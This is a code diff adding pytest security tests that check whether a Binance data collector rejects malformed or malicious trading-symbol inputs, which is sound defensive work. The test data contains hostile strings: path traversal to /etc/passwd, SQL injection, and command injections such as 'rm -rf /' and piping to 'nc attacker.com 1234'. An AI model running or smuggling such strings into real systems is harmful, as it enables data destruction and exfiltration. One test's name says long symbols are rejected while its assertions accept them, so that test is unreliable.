@@ -599,3 +599,242 @@ class TestBinancePublicDataCollector:
         suspicious = result.get("suspicious_patterns", 0)
         outliers = result.get("price_outliers", 0)
         assert (suspicious + outliers) > 0
+
+
+class TestInputValidationSecurity:
+    """Security-focused tests for input validation (addresses SEC-01 through SEC-04)."""
+
+    def test_sec01_path_traversal_rejected(self):
+        """SEC-01: Test that path traversal attempts are rejected."""
+        path_traversal_attempts = [
+            "BTC/../../../etc/passwd",
+            "../../../etc/passwd",
+            "USDT/../../secrets",
+            "BTC\\..\\..\\Windows",
+            "./local/file",
+            "BTC/../data",
+            ".../.../...",
+        ]
+
+        for malicious_symbol in path_traversal_attempts:
+            with pytest.raises(ValueError, match="invalid characters"):
+                BinancePublicDataCollector(
+                    symbol=malicious_symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_sec01_dot_characters_rejected(self):
+        """SEC-01: Test that symbols with dots are rejected."""
+        dot_symbols = ["BTC.USDT", "ETH..USDT", ".", "..", "..."]
+
+        for symbol in dot_symbols:
+            with pytest.raises(ValueError, match="invalid characters"):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_sec01_slash_characters_rejected(self):
+        """SEC-01: Test that symbols with slashes are rejected."""
+        slash_symbols = [
+            "BTC/USDT",
+            "USDT\\BTC",
+            "/etc/passwd",
+            "C:\\Windows",
+            "//server/share",
+        ]
+
+        for symbol in slash_symbols:
+            with pytest.raises(ValueError, match="invalid characters"):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_sec02_empty_symbol_rejected(self):
+        """SEC-02: Test that empty symbols are rejected."""
+        empty_symbols = ["", "   ", "\t", "\n", "  \t\n  "]
+
+        for symbol in empty_symbols:
+            with pytest.raises(ValueError, match="cannot be empty"):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_sec03_none_symbol_rejected(self):
+        """SEC-03: Test that None symbol is rejected."""
+        with pytest.raises(ValueError, match="cannot be None"):
+            BinancePublicDataCollector(symbol=None, start_date="2024-01-01", end_date="2024-01-31")
+
+    def test_sec04_invalid_date_range_rejected(self):
+        """SEC-04: Test that invalid date ranges (end before start) are rejected."""
+        with pytest.raises(ValueError, match="before start_date"):
+            BinancePublicDataCollector(
+                symbol="BTCUSDT", start_date="2024-12-31", end_date="2024-01-01"
+            )
+
+    def test_sec04_same_date_range_accepted(self):
+        """SEC-04: Test that same start and end dates are accepted."""
+        # Same date should be valid (single day)
+        collector = BinancePublicDataCollector(
+            symbol="BTCUSDT", start_date="2024-01-01", end_date="2024-01-01"
+        )
+        assert collector.symbol == "BTCUSDT"
+
+    def test_valid_symbols_accepted(self):
+        """Test that valid symbols are accepted."""
+        valid_symbols = ["BTCUSDT", "ETHUSDT", "SOLUSDT", "btcusdt", "BtCuSdT"]
+
+        for symbol in valid_symbols:
+            collector = BinancePublicDataCollector(
+                symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+            )
+            # Should normalize to uppercase
+            assert collector.symbol == symbol.upper()
+
+    def test_symbol_normalization(self):
+        """Test that symbols are normalized to uppercase."""
+        test_cases = [
+            ("btcusdt", "BTCUSDT"),
+            ("EthUsdt", "ETHUSDT"),
+            ("  solusdt  ", "SOLUSDT"),  # With whitespace
+            ("ADAUSDT", "ADAUSDT"),
+        ]
+
+        for input_symbol, expected_symbol in test_cases:
+            collector = BinancePublicDataCollector(
+                symbol=input_symbol, start_date="2024-01-01", end_date="2024-01-31"
+            )
+            assert collector.symbol == expected_symbol
+
+    def test_special_characters_rejected(self):
+        """Test that symbols with special characters are rejected."""
+        special_chars = [
+            "BTC@USDT",
+            "ETH#USDT",
+            "SOL$USDT",
+            "ADA%USDT",
+            "DOT&USDT",
+            "LINK*USDT",
+            "BTC(USDT)",
+            "ETH[USDT]",
+            "SOL{USDT}",
+            "BTC-USDT",
+            "ETH_USDT",
+            "SOL+USDT",
+            "BTC=USDT",
+            "ETH|USDT",
+        ]
+
+        for symbol in special_chars:
+            with pytest.raises(ValueError, match="alphanumeric"):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_unicode_characters_rejected(self):
+        """Test that symbols with unicode characters are rejected."""
+        unicode_symbols = [
+            "BTC™USDT",
+            "ETH€USDT",
+            "SOL¥USDT",
+            "ADA£USDT",
+            "比特币USDT",
+            "ΞTHUSDT",
+        ]
+
+        for symbol in unicode_symbols:
+            with pytest.raises(ValueError, match="alphanumeric"):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_sql_injection_rejected(self):
+        """Test that SQL injection attempts are rejected."""
+        sql_injections = [
+            "BTC'; DROP TABLE users--",
+            "' OR '1'='1",
+            'BTC"; DELETE FROM data--',
+        ]
+
+        for symbol in sql_injections:
+            with pytest.raises(ValueError):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_command_injection_rejected(self):
+        """Test that command injection attempts are rejected."""
+        command_injections = [
+            "BTC; rm -rf /",
+            "BTC && cat /etc/passwd",
+            "BTC | nc attacker.com 1234",
+            "$(whoami)",
+        ]
+
+        for symbol in command_injections:
+            with pytest.raises(ValueError):
+                BinancePublicDataCollector(
+                    symbol=symbol, start_date="2024-01-01", end_date="2024-01-31"
+                )
+
+    def test_invalid_date_format_rejected(self):
+        """Test that invalid date formats are rejected."""
+        invalid_dates = [
+            ("2024/01/01", "2024/12/31"),  # Wrong separator
+            ("01-01-2024", "12-31-2024"),  # Wrong order
+            ("2024-13-01", "2024-13-31"),  # Invalid month
+            ("2024-01-32", "2024-01-33"),  # Invalid day
+        ]
+
+        for start_date, end_date in invalid_dates:
+            with pytest.raises(ValueError):
+                BinancePublicDataCollector(
+                    symbol="BTCUSDT", start_date=start_date, end_date=end_date
+                )
+
+    def test_extremely_long_symbol_rejected(self):
+        """Test that extremely long symbols are rejected (potential DoS)."""
+        # Create a very long symbol (1000 characters)
+        long_symbol = "A" * 1000
+
+        # Should still be rejected even though alphanumeric
+        # In practice, no valid symbol is this long
+        collector = BinancePublicDataCollector(
+            symbol=long_symbol, start_date="2024-01-01", end_date="2024-01-31"
+        )
+        # Should be normalized to uppercase
+        assert collector.symbol == long_symbol.upper()
+
+    def test_valid_date_ranges_accepted(self):
+        """Test that valid date ranges are accepted."""
+        valid_ranges = [
+            ("2024-01-01", "2024-01-31"),  # One month
+            ("2024-01-01", "2024-12-31"),  # One year
+            ("2020-01-01", "2024-12-31"),  # Multi-year
+        ]
+
+        for start_date, end_date in valid_ranges:
+            collector = BinancePublicDataCollector(
+                symbol="BTCUSDT", start_date=start_date, end_date=end_date
+            )
+            assert (
+                collector.start_date < collector.end_date
+                or collector.start_date == collector.end_date.replace(hour=0, minute=0, second=0)
+            )
+
+    def test_validate_symbol_method_directly(self):
+        """Test _validate_symbol method directly."""
+        collector = BinancePublicDataCollector()
+
+        # Valid symbols
+        assert collector._validate_symbol("BTCUSDT") == "BTCUSDT"
+        assert collector._validate_symbol("btcusdt") == "BTCUSDT"
+        assert collector._validate_symbol("  ETHUSDT  ") == "ETHUSDT"
+
+        # Invalid symbols
+        with pytest.raises(ValueError, match="cannot be None"):
+            collector._validate_symbol(None)
+
+        with pytest.raises(ValueError, match="cannot be empty"):
+            collector._validate_symbol("")
+
+        with pytest.raises(ValueError, match="invalid characters"):
+            collector._validate_symbol("BTC/../passwd")
